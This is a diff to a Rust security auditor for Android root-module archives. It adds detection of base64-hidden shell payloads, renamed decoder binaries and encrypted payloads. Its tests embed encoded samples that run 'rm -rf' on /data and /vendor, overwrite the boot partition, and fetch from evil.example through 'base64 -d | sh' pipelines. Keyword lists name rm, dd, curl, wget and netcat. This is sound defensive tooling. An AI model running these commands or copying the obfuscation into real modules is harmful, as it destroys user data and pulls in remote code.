@@ -21,8 +21,15 @@ const RULE_BINARY_PRESENT: &str = "KSU-AUDIT-BIN-001";
 const RULE_BINARY_EXECUTED: &str = "KSU-AUDIT-BIN-002";
 const RULE_PACKED_SHELL: &str = "KSU-AUDIT-PACK-001";
 const RULE_UNPACK_LIMIT: &str = "KSU-AUDIT-PACK-002";
+const RULE_UNAUDITABLE_DECODER: &str = "KSU-AUDIT-PACK-003";
 const RULE_ARCHIVE_PATH: &str = "KSU-AUDIT-ZIP-001";
 const RULE_ARCHIVE_LIMIT: &str = "KSU-AUDIT-ZIP-002";
+const MAX_INDEXED_SOURCE_SIZE: usize = 4 * 1024 * 1024;
+const MIN_CONTENT_PAYLOAD_LENGTH: usize = 24;
+const MAX_CONTENT_PAYLOAD_LENGTH: usize = 1024 * 1024;
+const MAX_CONTENT_CANDIDATES: usize = 128;
+const MAX_CONTENT_PROBES: usize = 512;
+const MAX_CONTENT_PROBE_DEPTH: usize = 4;
 
 #[derive(Clone, Copy, Debug, Deserialize, Eq, Ord, PartialEq, PartialOrd, Serialize)]
 #[serde(rename_all = "lowercase")]
@@ -125,6 +132,21 @@ struct Artifact {
     depth: usize,
 }
 
+#[derive(Clone)]
+struct BinaryProfile {
+    path: String,
+    basename: String,
+    base64_like: bool,
+    openssl_like: bool,
+}
+
+struct DecodedCandidate {
+    line: usize,
+    bytes: Vec<u8>,
+    transform: String,
+    evidence: String,
+}
+
 #[derive(Default)]
 struct ScanState {
     findings: Vec<Finding>,
@@ -132,6 +154,8 @@ struct ScanState {
     derived_bytes: usize,
     derived_artifacts: usize,
     binaries: Vec<String>,
+    binary_profiles: Vec<BinaryProfile>,
+    archive_files: BTreeMap<String, Vec<u8>>,
     scripts: Vec<(String, String, Vec<String>)>,
 }
 
@@ -256,6 +280,13 @@ fn scan_zip_reader<R: Read + Seek>(
     }
 
     let scanned_files = entries.len();
+    for (path, bytes) in &entries {
+        if is_elf(bytes) {
+            state.binary_profiles.push(profile_binary(path, bytes));
+        } else if bytes.len() <= MAX_INDEXED_SOURCE_SIZE {
+            state.archive_files.insert(path.clone(), bytes.clone());
+        }
+    }
     for (path, bytes) in entries {
         scan_artifact(
             Artifact {
@@ -367,36 +398,53 @@ fn scan_artifact(
     }
 
     let looks_shell = looks_like_shell(&artifact.path, &artifact.bytes);
-    if !looks_shell {
-        return;
+    let text = String::from_utf8_lossy(&artifact.bytes).into_owned();
+    if looks_shell {
+        state.scripts.push((
+            artifact.path.clone(),
+            text.clone(),
+            artifact.provenance.clone(),
+        ));
+        analyze_shell(&artifact, &text, module_id, state);
     }
 
-    let text = String::from_utf8_lossy(&artifact.bytes).into_owned();
-    state.scripts.push((
-        artifact.path.clone(),
-        text.clone(),
-        artifact.provenance.clone(),
-    ));
-    analyze_shell(&artifact, &text, module_id, state);
-
-    for (line, decoded) in decode_static_base64_shells(&text) {
+    let mut candidates = if looks_shell {
+        decode_static_base64_payloads(&artifact, &text, module_id, state)
+    } else {
+        Vec::new()
+    };
+    let mut decoded_digests: BTreeSet<_> = candidates
+        .iter()
+        .map(|candidate| sha256_bytes(&candidate.bytes))
+        .collect();
+    if std::str::from_utf8(&artifact.bytes).is_ok() {
+        for candidate in discover_content_base64_payloads(&text, module_id) {
+            if decoded_digests.insert(sha256_bytes(&candidate.bytes)) {
+                candidates.push(candidate);
+            }
+        }
+    }
+    for candidate in candidates {
         add_finding(
             state,
             &artifact,
             RULE_PACKED_SHELL,
             Severity::Notice,
-            Some(line),
+            Some(candidate.line),
             "Encoded shell payload",
-            "static base64 pipeline decoded without executing it",
+            &candidate.evidence,
         );
         scan_derived_bytes(
             artifact.clone(),
-            decoded,
-            "base64 shell payload",
+            candidate.bytes,
+            &candidate.transform,
             module_id,
             config,
             state,
         );
+    }
+    if !looks_shell {
+        return;
     }
     for (line, decoded) in decode_static_shell_commands(&text) {
         add_finding(
@@ -545,49 +593,431 @@ fn scan_derived_bytes(
     );
 }
 
-fn decode_static_base64_shells(text: &str) -> Vec<(usize, Vec<u8>)> {
+fn decode_static_base64_payloads(
+    artifact: &Artifact,
+    text: &str,
+    module_id: Option<&str>,
+    state: &mut ScanState,
+) -> Vec<DecodedCandidate> {
     let mut decoded = Vec::new();
-    for (line_index, line) in text.lines().enumerate() {
+    let mut variables = predefined_variables(module_id);
+    for (line_index, line) in logical_lines(text).iter().enumerate() {
         let tokens = shell_tokens(line);
-        let commands = split_commands(&tokens);
-        if commands.len() < 3 {
-            continue;
-        }
-        let (producer, producer_args) = normalize_command(commands[0]);
-        if !matches!(producer.as_str(), "echo" | "printf") {
-            continue;
-        }
-        let base64_index = commands.iter().position(|command| {
-            let (name, args) = normalize_command(command);
-            name == "base64"
-                && args
+        collect_assignments(&tokens, &mut variables);
+        for commands in split_pipeline_groups(&tokens) {
+            for (decoder_index, command) in commands.iter().enumerate() {
+                let expanded: Vec<_> = command
                     .iter()
-                    .any(|arg| matches!(arg.as_str(), "-d" | "--decode"))
-        });
-        let shell_index = commands.iter().rposition(|command| {
-            matches!(normalize_command(command).0.as_str(), "sh" | "ash" | "bash")
-        });
-        let (Some(base64_index), Some(shell_index)) = (base64_index, shell_index) else {
-            continue;
-        };
-        if base64_index >= shell_index {
-            continue;
-        }
-        let payload_args =
-            if producer == "printf" && producer_args.first().is_some_and(|arg| arg.contains('%')) {
-                &producer_args[1..]
-            } else {
-                producer_args.as_slice()
-            };
-        let encoded = payload_args.join(if producer == "echo" { " " } else { "" });
-        if encoded.contains('$') || encoded.contains('`') || encoded.contains("$(") {
-            continue;
-        }
-        if let Some(bytes) = decode_base64(&encoded) {
-            decoded.push((line_index + 1, bytes));
+                    .map(|token| expand_variables(token, &variables))
+                    .collect();
+                let (name, args) = normalize_command(&expanded);
+                if name.is_empty() || !has_decode_flag(&args) {
+                    continue;
+                }
+
+                let profile = binary_profile_for_command(&name, &state.binary_profiles);
+                let openssl_grammar = has_openssl_base64_grammar(&args);
+                let known_base64 = name == "base64"
+                    || openssl_grammar
+                    || profile.is_some_and(|value| value.base64_like || value.openssl_like);
+                let feeds_shell = commands.iter().skip(decoder_index + 1).any(|next| {
+                    let expanded: Vec<_> = next
+                        .iter()
+                        .map(|token| expand_variables(token, &variables))
+                        .collect();
+                    matches!(
+                        normalize_command(&expanded).0.as_str(),
+                        "sh" | "ash" | "bash"
+                    )
+                });
+
+                if has_openssl_cipher(&args) {
+                    add_finding(
+                        state,
+                        artifact,
+                        RULE_UNAUDITABLE_DECODER,
+                        Severity::High,
+                        Some(line_index + 1),
+                        "Encrypted payload cannot be statically decoded",
+                        line.trim(),
+                    );
+                    continue;
+                }
+
+                let encoded = decoder_input(
+                    decoder_index,
+                    &commands,
+                    &args,
+                    &variables,
+                    module_id,
+                    &state.archive_files,
+                );
+                let Some(encoded) = encoded else {
+                    if feeds_shell && profile.is_some() {
+                        add_finding(
+                            state,
+                            artifact,
+                            RULE_UNAUDITABLE_DECODER,
+                            Severity::High,
+                            Some(line_index + 1),
+                            "Bundled decoder output cannot be audited",
+                            line.trim(),
+                        );
+                    }
+                    continue;
+                };
+                let Ok(encoded) = std::str::from_utf8(&encoded) else {
+                    continue;
+                };
+                let Some(bytes) = decode_base64(encoded) else {
+                    continue;
+                };
+                if !known_base64 && (profile.is_none() || !looks_like_decoded_payload(&bytes)) {
+                    continue;
+                }
+
+                let inferred = if name == "base64" {
+                    "base64 command".to_owned()
+                } else if openssl_grammar {
+                    "OpenSSL-compatible argument grammar".to_owned()
+                } else if profile.is_some_and(|value| value.base64_like || value.openssl_like) {
+                    format!(
+                        "bundled decoder binary fingerprint ({})",
+                        profile.map_or("unknown", |value| value.path.as_str())
+                    )
+                } else {
+                    format!(
+                        "decoded payload content heuristic with bundled binary ({})",
+                        profile.map_or("unknown", |value| value.path.as_str())
+                    )
+                };
+                let transform = if name == "base64" {
+                    "base64 shell payload"
+                } else {
+                    "heuristic base64 payload"
+                };
+                decoded.push(DecodedCandidate {
+                    line: line_index + 1,
+                    bytes,
+                    transform: transform.to_owned(),
+                    evidence: format!(
+                        "decoded without execution using {inferred}: {}",
+                        line.trim()
+                    ),
+                });
+            }
         }
     }
     decoded
+}
+
+fn discover_content_base64_payloads(text: &str, module_id: Option<&str>) -> Vec<DecodedCandidate> {
+    let mut output = Vec::new();
+    let mut seen_encoded = BTreeSet::new();
+    let mut variables = predefined_variables(module_id);
+
+    collect_content_candidate(text, 1, "text content", &mut seen_encoded, &mut output);
+    for (line_index, line) in logical_lines(text).iter().enumerate() {
+        let tokens = shell_tokens(line);
+        collect_assignments(&tokens, &mut variables);
+        for token in &tokens {
+            if matches!(token.as_str(), ";" | "|" | "&&" | "||" | "&" | "(" | ")") {
+                continue;
+            }
+            let value = if let Some((name, _)) = token.split_once('=')
+                && is_variable_name(name)
+            {
+                variables.get(name).cloned().unwrap_or_default()
+            } else {
+                expand_variables(token, &variables)
+            };
+            collect_content_candidate(
+                &value,
+                line_index + 1,
+                "static shell content",
+                &mut seen_encoded,
+                &mut output,
+            );
+            if output.len() >= MAX_CONTENT_CANDIDATES {
+                return output;
+            }
+        }
+    }
+    output
+}
+
+fn collect_content_candidate(
+    value: &str,
+    line: usize,
+    source: &str,
+    seen_encoded: &mut BTreeSet<String>,
+    output: &mut Vec<DecodedCandidate>,
+) {
+    if output.len() >= MAX_CONTENT_CANDIDATES || seen_encoded.len() >= MAX_CONTENT_PROBES {
+        return;
+    }
+    let probe_budget = MAX_CONTENT_PROBES - seen_encoded.len();
+    let mut candidates = Vec::new();
+    let trimmed = value.trim();
+    if is_base64_candidate(trimmed) {
+        candidates.push(trimmed);
+    }
+
+    let mut start = None;
+    for (index, character) in value.char_indices() {
+        if candidates.len() >= probe_budget {
+            start = None;
+            break;
+        }
+        if is_base64_character(character) {
+            start.get_or_insert(index);
+        } else if let Some(offset) = start.take() {
+            candidates.push(&value[offset..index]);
+        }
+    }
+    if let Some(offset) = start {
+        candidates.push(&value[offset..]);
+    }
+
+    for encoded in candidates {
+        let encoded = encoded.trim();
+        if !is_base64_candidate(encoded)
+            || seen_encoded.len() >= MAX_CONTENT_PROBES
+            || !seen_encoded.insert(encoded.to_owned())
+            || output.len() >= MAX_CONTENT_CANDIDATES
+        {
+            continue;
+        }
+        let Some(bytes) = decode_base64(encoded) else {
+            continue;
+        };
+        if !is_high_confidence_content_payload(&bytes, 0) {
+            continue;
+        }
+        output.push(DecodedCandidate {
+            line,
+            bytes,
+            transform: "content-discovered base64 payload".to_owned(),
+            evidence: format!(
+                "decoded without relying on a decoder command from {source} ({} encoded bytes)",
+                encoded.len()
+            ),
+        });
+    }
+}
+
+fn is_base64_candidate(value: &str) -> bool {
+    let length = value
+        .bytes()
+        .filter(|byte| !byte.is_ascii_whitespace())
+        .count();
+    (MIN_CONTENT_PAYLOAD_LENGTH..=MAX_CONTENT_PAYLOAD_LENGTH).contains(&length)
+        && value
+            .chars()
+            .all(|character| character.is_ascii_whitespace() || is_base64_character(character))
+}
+
+fn is_base64_character(character: char) -> bool {
+    character.is_ascii_alphanumeric() || matches!(character, '+' | '/' | '-' | '_' | '=')
+}
+
+fn is_high_confidence_content_payload(bytes: &[u8], depth: usize) -> bool {
+    if looks_like_content_payload(bytes) {
+        return true;
+    }
+    if depth >= MAX_CONTENT_PROBE_DEPTH {
+        return false;
+    }
+    let Ok(text) = std::str::from_utf8(bytes) else {
+        return false;
+    };
+    let candidate = text.trim();
+    is_base64_candidate(candidate)
+        && decode_base64(candidate)
+            .is_some_and(|decoded| is_high_confidence_content_payload(&decoded, depth + 1))
+}
+
+fn looks_like_content_payload(bytes: &[u8]) -> bool {
+    if is_elf(bytes) || bytes.starts_with(&[0x1f, 0x8b]) || bytes.starts_with(b"#!") {
+        return true;
+    }
+    let Ok(text) = std::str::from_utf8(bytes) else {
+        return false;
+    };
+    let mut shell_score = 0;
+    for line in logical_lines(text) {
+        let tokens = shell_tokens(&line);
+        for command in split_commands(&tokens) {
+            let (name, args) = normalize_command(command);
+            if matches!(
+                name.as_str(),
+                "rm" | "dd" | "curl" | "wget" | "nc" | "netcat" | "insmod" | "modprobe"
+            ) {
+                return true;
+            }
+            if matches!(
+                name.as_str(),
+                "sh" | "ash" | "bash" | "export" | "set" | "echo" | "printf" | "mount" | "umount"
+            ) || !args.is_empty() && command.iter().any(|token| is_assignment(token))
+            {
+                shell_score += 1;
+            }
+        }
+    }
+    shell_score >= 2
+}
+
+fn has_decode_flag(args: &[String]) -> bool {
+    args.iter().any(|arg| {
+        matches!(
+            arg.as_str(),
+            "-d" | "-D" | "--decode" | "-decode" | "-dc" | "-cd"
+        )
+    })
+}
+
+fn has_openssl_base64_grammar(args: &[String]) -> bool {
+    args.iter().any(|arg| arg == "base64")
+        || args.iter().any(|arg| arg == "enc")
+            && args
+                .iter()
+                .any(|arg| matches!(arg.as_str(), "-a" | "-base64"))
+}
+
+fn has_openssl_cipher(args: &[String]) -> bool {
+    args.iter().any(|arg| {
+        let arg = arg.to_ascii_lowercase();
+        arg.starts_with("-aes-")
+            || arg.starts_with("-des")
+            || arg.starts_with("-chacha")
+            || arg.starts_with("-aria")
+            || arg.starts_with("-camellia")
+    })
+}
+
+fn decoder_input(
+    decoder_index: usize,
+    commands: &[&[String]],
+    args: &[String],
+    variables: &BTreeMap<String, String>,
+    module_id: Option<&str>,
+    archive_files: &BTreeMap<String, Vec<u8>>,
+) -> Option<Vec<u8>> {
+    if decoder_index > 0
+        && let Some(payload) = producer_payload(
+            commands[decoder_index - 1],
+            variables,
+            module_id,
+            archive_files,
+        )
+    {
+        return Some(payload);
+    }
+    if let Some(index) = args.iter().position(|arg| arg == "-in")
+        && let Some(path) = args.get(index + 1)
+    {
+        return lookup_archive_file(path, variables, module_id, archive_files);
+    }
+    let mut positional = Vec::new();
+    let mut index = 0;
+    while index < args.len() {
+        if matches!(args[index].as_str(), "-out" | "-in") {
+            index += 2;
+            continue;
+        }
+        let arg = &args[index];
+        if arg.starts_with('-') || matches!(arg.as_str(), "enc" | "base64") {
+            index += 1;
+            continue;
+        }
+        positional.push(arg);
+        index += 1;
+    }
+    for arg in positional.into_iter().rev() {
+        if let Some(bytes) = lookup_archive_file(arg, variables, module_id, archive_files) {
+            return Some(bytes);
+        }
+    }
+    None
+}
+
+fn producer_payload(
+    command: &[String],
+    variables: &BTreeMap<String, String>,
+    module_id: Option<&str>,
+    archive_files: &BTreeMap<String, Vec<u8>>,
+) -> Option<Vec<u8>> {
+    let expanded: Vec<_> = command
+        .iter()
+        .map(|token| expand_variables(token, variables))
+        .collect();
+    let (name, args) = normalize_command(&expanded);
+    match name.as_str() {
+        "echo" => Some(
+            args.iter()
+                .filter(|arg| !matches!(arg.as_str(), "-n" | "-e" | "-E"))
+                .cloned()
+                .collect::<Vec<_>>()
+                .join(" ")
+                .into_bytes(),
+        ),
+        "printf" => {
+            let payload = if args.first().is_some_and(|arg| arg.contains('%')) {
+                &args[1..]
+            } else {
+                args.as_slice()
+            };
+            Some(payload.join("").into_bytes())
+        }
+        "cat" => args
+            .iter()
+            .find_map(|path| lookup_archive_file(path, variables, module_id, archive_files)),
+        _ => None,
+    }
+}
+
+fn lookup_archive_file(
+    path: &str,
+    variables: &BTreeMap<String, String>,
+    module_id: Option<&str>,
+    archive_files: &BTreeMap<String, Vec<u8>>,
+) -> Option<Vec<u8>> {
+    let expanded = expand_variables(path, variables);
+    let mut candidates = vec![expanded.trim_start_matches("./").to_owned()];
+    if let Some(id) = module_id {
+        for prefix in [
+            format!("/data/adb/modules_update/{id}/"),
+            format!("/data/adb/modules/{id}/"),
+        ] {
+            if let Some(relative) = expanded.strip_prefix(&prefix) {
+                candidates.push(relative.to_owned());
+            }
+        }
+    }
+    candidates
+        .into_iter()
+        .find_map(|candidate| archive_files.get(&candidate).cloned())
+}
+
+fn binary_profile_for_command<'a>(
+    name: &str,
+    profiles: &'a [BinaryProfile],
+) -> Option<&'a BinaryProfile> {
+    let mut matches = profiles.iter().filter(|profile| profile.basename == name);
+    let first = matches.next()?;
+    matches.next().is_none().then_some(first)
+}
+
+fn looks_like_decoded_payload(bytes: &[u8]) -> bool {
+    if is_elf(bytes) || bytes.starts_with(&[0x1f, 0x8b]) || bytes.starts_with(b"#!") {
+        return true;
+    }
+    let Ok(text) = std::str::from_utf8(bytes) else {
+        return false;
+    };
+    ["rm ", "dd ", "curl ", "wget ", "sh ", "export ", "#!/"]
+        .iter()
+        .any(|marker| text.contains(marker))
 }
 
 fn decode_static_shell_commands(text: &str) -> Vec<(usize, Vec<u8>)> {
@@ -622,20 +1052,31 @@ fn decode_static_shell_commands(text: &str) -> Vec<(usize, Vec<u8>)> {
 }
 
 fn decode_base64(value: &str) -> Option<Vec<u8>> {
-    let values: Vec<u8> = value
+    let mut encoded: Vec<u8> = value
         .bytes()
         .filter(|byte| !byte.is_ascii_whitespace())
+        .collect();
+    if encoded.is_empty() || encoded.len() % 4 == 1 {
+        return None;
+    }
+    while !encoded.len().is_multiple_of(4) {
+        encoded.push(b'=');
+    }
+    let values: Vec<u8> = encoded
+        .into_iter()
         .map(|byte| match byte {
             b'A'..=b'Z' => Some(byte - b'A'),
             b'a'..=b'z' => Some(byte - b'a' + 26),
             b'0'..=b'9' => Some(byte - b'0' + 52),
-            b'+' => Some(62),
-            b'/' => Some(63),
+            b'+' | b'-' => Some(62),
+            b'/' | b'_' => Some(63),
             b'=' => Some(64),
             _ => None,
         })
         .collect::<Option<_>>()?;
-    if values.is_empty() || values.len() & 3 != 0 {
+    if let Some(padding) = values.iter().position(|value| *value == 64)
+        && (values.len() - padding > 2 || values[padding..].iter().any(|value| *value != 64))
+    {
         return None;
     }
     let mut output = Vec::with_capacity(values.len() / 4 * 3);
@@ -1040,6 +1481,23 @@ fn binary_has_network_indicators(bytes: &[u8]) -> bool {
     })
 }
 
+fn profile_binary(path: &str, bytes: &[u8]) -> BinaryProfile {
+    BinaryProfile {
+        path: path.to_owned(),
+        basename: posix_basename(path).to_owned(),
+        base64_like: contains_any_bytes(bytes, &[b"base64", b"--decode", b"BIO_f_base64"]),
+        openssl_like: contains_any_bytes(bytes, &[b"OpenSSL", b"libcrypto", b"EVP_"]),
+    }
+}
+
+fn contains_any_bytes(bytes: &[u8], indicators: &[&[u8]]) -> bool {
+    indicators.iter().any(|indicator| {
+        bytes
+            .windows(indicator.len())
+            .any(|window| window == *indicator)
+    })
+}
+
 fn logical_lines(text: &str) -> Vec<String> {
     let mut output = Vec::new();
     let mut current = String::new();
@@ -1133,6 +1591,39 @@ fn split_commands(tokens: &[String]) -> Vec<&[String]> {
         commands.push(&tokens[start..]);
     }
     commands
+}
+
+fn split_pipeline_groups(tokens: &[String]) -> Vec<Vec<&[String]>> {
+    let mut groups = Vec::new();
+    let mut group = Vec::new();
+    let mut start = 0;
+    for (index, token) in tokens.iter().enumerate() {
+        match token.as_str() {
+            "|" => {
+                if start < index {
+                    group.push(&tokens[start..index]);
+                }
+                start = index + 1;
+            }
+            ";" | "&&" | "||" | "&" | "(" | ")" => {
+                if start < index {
+                    group.push(&tokens[start..index]);
+                }
+                if !group.is_empty() {
+                    groups.push(std::mem::take(&mut group));
+                }
+                start = index + 1;
+            }
+            _ => {}
+        }
+    }
+    if start < tokens.len() {
+        group.push(&tokens[start..]);
+    }
+    if !group.is_empty() {
+        groups.push(group);
+    }
+    groups
 }
 
 fn operands_before_redirection(args: &[String]) -> Vec<&String> {
@@ -1440,6 +1931,14 @@ mod tests {
         writer.finish().unwrap().into_inner()
     }
 
+    fn elf_with_markers(markers: &[u8]) -> Vec<u8> {
+        let mut elf = vec![0_u8; 64];
+        elf[..6].copy_from_slice(b"\x7fELF\x02\x01");
+        elf[16..18].copy_from_slice(&2_u16.to_le_bytes());
+        elf.extend_from_slice(markers);
+        elf
+    }
+
     #[test]
     fn detects_partition_writes_and_broad_delete() {
         let script = b"#!/system/bin/sh\nBLOCK=/dev/block/by-name/boot\nbusybox dd if=boot.img of=$BLOCK\nrm -rf /data\n";
@@ -1523,6 +2022,201 @@ mod tests {
             .find(|finding| finding.rule_id == RULE_BROAD_DELETE)
             .unwrap();
         assert_eq!(delete.provenance, ["base64 shell payload (layer 1)"]);
+    }
+
+    #[test]
+    fn audits_renamed_openssl_base64_grammar() {
+        let decoder = elf_with_markers(b"stripped");
+        let zip = module_zip(&[
+            ("module.prop", b"id=renamed_decoder\n"),
+            (
+                "customize.sh",
+                b"#!/system/bin/sh\nPAYLOAD=cm0gLXJmIC92ZW5kb3IK\nDECODER=$MODPATH/bin/a\necho \"$PAYLOAD\" | \"$DECODER\" enc -d -base64 | sh\n",
+            ),
+            ("bin/a", &decoder),
+        ]);
+        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
+        let delete = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
+            .unwrap();
+        assert_eq!(delete.provenance, ["heuristic base64 payload (layer 1)"]);
+    }
+
+    #[test]
+    fn audits_renamed_decoder_using_binary_fingerprint() {
+        let decoder = elf_with_markers(b"usage: codec --decode base64");
+        let zip = module_zip(&[
+            ("module.prop", b"id=fingerprinted_decoder\n"),
+            (
+                "service.sh",
+                b"#!/system/bin/sh\necho cm0gLXJmIC9kYXRhCg | $MODPATH/bin/codec -d | sh\n",
+            ),
+            ("bin/codec", &decoder),
+        ]);
+        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
+        assert!(report.findings.iter().any(|finding| {
+            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
+        }));
+    }
+
+    #[test]
+    fn audits_base64_without_padding() {
+        let report = scan_file_bytes(
+            "service.sh",
+            b"#!/system/bin/sh\necho cm0gLXJmIC9kYXRhCg | base64 --decode | sh\n",
+            &AuditConfig::default(),
+        );
+        assert!(report.findings.iter().any(|finding| {
+            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
+        }));
+        assert_eq!(decode_base64("_w"), Some(vec![0xff]));
+    }
+
+    #[test]
+    fn discovers_payload_without_decoder_command() {
+        let report = scan_file_bytes(
+            "customize.sh",
+            b"#!/system/bin/sh\nPAYLOAD=IyEvc3lzdGVtL2Jpbi9zaApybSAtcmYgL3ZlbmRvcgpjdXJsIGh0dHBzOi8vZXZpbC5leGFtcGxlL3AK\nrun_custom_format \"$PAYLOAD\"\n",
+            &AuditConfig::default(),
+        );
+        let delete = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
+            .unwrap();
+        assert_eq!(
+            delete.provenance,
+            ["content-discovered base64 payload (layer 1)"]
+        );
+        assert!(
+            report.findings.iter().any(|finding| {
+                finding.rule_id == RULE_NETWORK && !finding.provenance.is_empty()
+            })
+        );
+    }
+
+    #[test]
+    fn discovers_concatenated_and_nested_payload() {
+        let report = scan_file_bytes(
+            "service.sh",
+            b"#!/system/bin/sh\nA=SXlFdmMzbHpkR1Z0TDJKcGJpOXphQXB5\nB=YlNBdGNtWWdMM1psYm1SdmNnbz0=\nPAYLOAD=$A$B\nunknown_runner $PAYLOAD\n",
+            &AuditConfig::default(),
+        );
+        let delete = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty())
+            .unwrap();
+        assert_eq!(delete.provenance.len(), 2);
+        assert!(
+            delete
+                .provenance
+                .iter()
+                .all(|layer| layer.starts_with("content-discovered base64 payload"))
+        );
+    }
+
+    #[test]
+    fn discovers_payload_in_non_script_archive_file() {
+        let zip = module_zip(&[
+            ("module.prop", b"id=content_payload\n"),
+            (
+                "payload.dat",
+                b"IyEvc3lzdGVtL2Jpbi9zaApybSAtcmYgL3ZlbmRvcgpjdXJsIGh0dHBzOi8vZXZpbC5leGFtcGxlL3AK",
+            ),
+        ]);
+        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
+        assert!(report.findings.iter().any(|finding| {
+            finding.path == "payload.dat"
+                && finding.rule_id == RULE_BROAD_DELETE
+                && !finding.provenance.is_empty()
+        }));
+    }
+
+    #[test]
+    fn discovers_base64_wrapped_gzip_payload() {
+        let report = scan_file_bytes(
+            "payload.txt",
+            b"H4sIAAAAAAAAA1NW1C+uLC5JzdVPyszTL87gSklRyEyzrVDIT7PVT0kt00/KyU/O1k+q1M1LzE3VT8rPL+ECAB6Yrwo0AAAA",
+            &AuditConfig::default(),
+        );
+        assert!(report.findings.iter().any(|finding| {
+            finding.rule_id == RULE_PARTITION_WRITE && finding.provenance.len() == 2
+        }));
+    }
+
+    #[test]
+    fn ignores_harmless_base64_content() {
+        let report = scan_file_bytes(
+            "README.txt",
+            b"VGhpcyBpcyBhIGhhcm1sZXNzIGRvY3VtZW50YXRpb24gc3RyaW5nLg==\niVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=\n",
+            &AuditConfig::default(),
+        );
+        assert!(report.findings.is_empty());
+        assert_eq!(report.derived_artifacts, 0);
+    }
+
+    #[test]
+    fn does_not_cross_statement_boundaries_for_decoder_input() {
+        let report = scan_file_bytes(
+            "service.sh",
+            b"#!/system/bin/sh\necho cm0gLXJmIC92ZW5kb3IK; base64 -d | sh\n",
+            &AuditConfig::default(),
+        );
+        assert!(!report.findings.iter().any(|finding| {
+            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
+        }));
+    }
+
+    #[test]
+    fn audits_static_archive_input_to_renamed_decoder() {
+        let decoder = elf_with_markers(b"stripped");
+        let zip = module_zip(&[
+            ("module.prop", b"id=archive_input\n"),
+            (
+                "customize.sh",
+                b"#!/system/bin/sh\n$MODPATH/bin/filter base64 -d -in payload.txt | sh\n",
+            ),
+            ("payload.txt", b"cm0gLXJmIC92ZW5kb3IK"),
+            ("bin/filter", &decoder),
+        ]);
+        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
+        assert!(report.findings.iter().any(|finding| {
+            finding.rule_id == RULE_BROAD_DELETE && !finding.provenance.is_empty()
+        }));
+    }
+
+    #[test]
+    fn warns_when_bundled_decoder_output_is_unknown() {
+        let decoder = elf_with_markers(b"custom unpacker");
+        let zip = module_zip(&[
+            ("module.prop", b"id=unknown_decoder\n"),
+            (
+                "customize.sh",
+                b"#!/system/bin/sh\ncat $DYNAMIC_PAYLOAD | $MODPATH/bin/unpack -d | sh\n",
+            ),
+            ("bin/unpack", &decoder),
+        ]);
+        let report = scan_zip_bytes(&zip, &AuditConfig::default()).unwrap();
+        let finding = report
+            .findings
+            .iter()
+            .find(|finding| finding.rule_id == RULE_UNAUDITABLE_DECODER)
+            .unwrap();
+        assert_eq!(finding.severity, Severity::High);
+    }
+
+    #[test]
+    fn encrypted_openssl_payload_is_not_misreported_as_base64() {
+        let report = scan_file_bytes(
+            "customize.sh",
+            b"#!/system/bin/sh\necho U2FsdGVkX1+payload | tool enc -d -aes-256-cbc -a -pass pass:x | sh\n",
+            &AuditConfig::default(),
+        );
+        assert!(rules(&report).contains(&RULE_UNAUDITABLE_DECODER));
+        assert_eq!(report.derived_artifacts, 0);
     }
 
     #[test]
